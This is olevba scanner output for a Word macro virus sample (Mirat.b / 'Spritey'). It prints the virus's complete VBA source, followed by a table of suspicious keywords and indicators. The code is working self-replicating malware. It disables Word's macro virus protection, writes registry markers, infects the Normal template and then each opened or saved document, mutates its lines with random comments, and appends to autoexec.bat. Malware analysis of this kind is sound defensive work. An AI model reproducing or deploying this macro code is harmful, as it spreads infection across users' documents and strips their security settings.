olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mirat.b-3fbd4d956854b36bb0ea6841577f9f5b9badf63b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mirat.b-3fbd4d956854b36bb0ea6841577f9f5b9badf63b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO fUY.bas 
in file: Virus.MSWord.Mirat.b-3fbd4d956854b36bb0ea6841577f9f5b9badf63b - OLE stream: 'Macros/VBA/fUY'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'It's Sprite again..  I love drinking Sprite, do you want some ? 'BD|! 'BD|! 'BD|!
'W97/Spritey '{�u% '{�u% '{�u%
'Galaxynet IRC #VX 'Q‡~L 'Q‡~L 'Q‡~L
Sub AutoOpen() '“ˆ&‘ '“ˆ&‘ '“ˆ&‘
On Error Resume Next 'K^|& 'K^|& 'K^|&
StatusBar = "<< Sprite lives somewhere in your document! Ain't you afraid? >>" 'gXCj 'gXCj 'gXCj
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Sprite") <> "Love" Then 'm?Aƒ 'm?Aƒ 'm?Aƒ
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Sprite") = "Love" '‚f–� '‚f–� '‚f–�
Options.VirusProtection = (2 Xor 2) ';s•= ';s•= ';s•=
Dim wm, sex, gabe '`,—q '`,—q '`,—q
gabe = Chr(Int((100 * Rnd) + 32)) + Chr(Int((100 * Rnd) + 32)) + Chr(Int((100 * Rnd) + 32)) '!e,, '!e,, '!e,,
ActiveDocument.VBProject.VBComponents(2).Name = gabe 'B%C 'B%C 'B%C
wm = ActiveDocument.VBProject.VBComponents.Item(2).CodeModule.CountOfLines 'MD‘• 'MD‘• 'MD‘•
Set myTemplate = NormalTemplate 'PA33 'PA33 'PA33
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=myTemplate.FullName, Name:=gabe, Object:=wdOrganizerObjectProjectItems 'mQQu 'mQQu 'mQQu
For i = 1 To wm 'Gk86 'Gk86 'Gk86
sex = ActiveDocument.VBProject.VBComponents(2).CodeModule.Lines(i, 1) 'f)VŒ 'f)VŒ 'f)VŒ
poly = Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) '?~MB '?~MB '?~MB
strn = sex + " '" + poly 'ŽkkS 'ŽkkS 'ŽkkS
NormalTemplate.VBProject.VBComponents.Item(2).CodeModule.ReplaceLine i, strn '+cs� '+cs� '+cs�
Next i '„"a� '„"a� '„"a�
Documents.Open FileName:=NormalTemplate.FullName, ConfirmConversions:=False, ReadOnly:=False, AddToRecentFiles:=False, PasswordDocument:="", PasswordTemplate:="", Revert:=False, WritePasswordDocument:="", WritePasswordTemplate:="", Format:=wdOpenFormatAuto 'Sq\] 'Sq\] 'Sq\]
ActiveDocument.Save 'WJP@ 'WJP@ 'WJP@
ActiveDocument.Close '&=•' '&=•' '&=•'
Open "C:\autoexec.bat" For Append As #1 'NKZ2 'NKZ2 'NKZ2
Print #1, "@echo off" 'X>ka 'X>ka 'X>ka
Print #1, "echo TheOne-Gabe-Yulaw" '2�n\ '2�n\ '2�n\
Print #1, "echo Sprite is living in your system.. do you want to see Sprite? --- Galaxynet IRC #VX" 'N,~W 'N,~W 'N,~W
Print #1, "echo." 'zgƒ" 'zgƒ" 'zgƒ"
Close #1 '9(,G '9(,G '9(,G
End If '/ `n '/ `n '/ `n
End Sub 'aƒ)7 'aƒ)7 'aƒ)7
Sub AutoClose() 'qVJ1 'qVJ1 'qVJ1
On Error Resume Next 't�_* 't�_* 't�_*
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "VX") = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "VX") + 1 'zPW[ 'zPW[ 'zPW[
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "VX") >= 10 Then MsgBox "Sprite, you are very cute boy!! Do you agree??", vbYesNo, "Sprite is gonna spread now !" '8G+f '8G+f '8G+f
Dim gabe, myTemplate '4�+U '4�+U '4�+U
myTemplate = NormalTemplate '@ˆz@ '@ˆz@ '@ˆz@
gabe = NormalTemplate.VBProject.VBComponents(2).Name 'p>*# 'p>*# 'p>*#
For Each aVar In ActiveDocument.Variables 'F~C< 'F~C< 'F~C<
If aVar.Name = "Inf" Then num = aVar.Index 'Y>H% 'Y>H% 'Y>H%
Next aVar 'Y8‡f 'Y8‡f 'Y8‡f
If (num = 0) And (ActiveDocument.FullName <> myTemplate.FullName) Then 'z�Ga 'z�Ga 'z�Ga
ActiveDocument.Variables.Add Name:="Inf" ')lQ“ ')lQ“ ')lQ“
ActiveDocument.Variables("Inf").Value = 1 '-ŽjI '-ŽjI '-ŽjI
Set myTemplate = ActiveDocument.AttachedTemplate '1Y:— '1Y:— '1Y:—
Application.OrganizerCopy Source:=myTemplate.FullName, Destination:=ActiveDocument.FullName, Name:=gabe, Object:=wdOrganizerObjectProjectItems '/#Ia '/#Ia '/#Ia
ActiveDocument.Save 'Ž`P… 'Ž`P… 'Ž`P…
End If 'ƒpv— 'ƒpv— 'ƒpv—
End Sub 'H[Qs 'H[Qs 'H[Qs
Sub AutoSave() '5Ra� '5Ra� '5Ra�
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "VX") = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "VX") + 1 '`S]; '`S]; '`S];
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "VX") >= 10 Then MsgBox "Is Sprite a cute little boy?", vbYesNo, "Sprite is gonna do some speading!" 'jZqŠ 'jZqŠ 'jZqŠ
On Error Resume Next 'LDC2 'LDC2 'LDC2
Dim gabe, myTemplate '_:fK '_:fK '_:fK
myTemplate = NormalTemplate '‰Y6r '‰Y6r '‰Y6r
gabe = NormalTemplate.VBProject.VBComponents(2).Name 'yi}3 'yi}3 'yi}3
For Each aVar In ActiveDocument.Variables '€8’' '€8’' '€8’'
If aVar.Name = "Inf" Then num = aVar.Index ''MW ''MW ''MW
Next aVar '.-4% '.-4% '.-4%
If (num = 0) And (ActiveDocument.FullName <> myTemplate.FullName) Then 'u_c: 'u_c: 'u_c:
ActiveDocument.Variables.Add Name:="Inf" 'XyzO 'XyzO 'XyzO
ActiveDocument.Variables("Inf").Value = 1 'Œy*l 'Œy*l 'Œy*l
Set myTemplate = ActiveDocument.AttachedTemplate 'u!SP 'u!SP 'u!SP
Application.OrganizerCopy Source:=myTemplate.FullName, Destination:=ActiveDocument.FullName, Name:=gabe, Object:=wdOrganizerObjectProjectItems 'A–€s 'A–€s 'A–€s
ActiveDocument.Save 'RxAJ 'RxAJ 'RxAJ
End If 'T‘.m 'T‘.m 'T‘.m
End Sub 'I,6) 'I,6) 'I,6)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

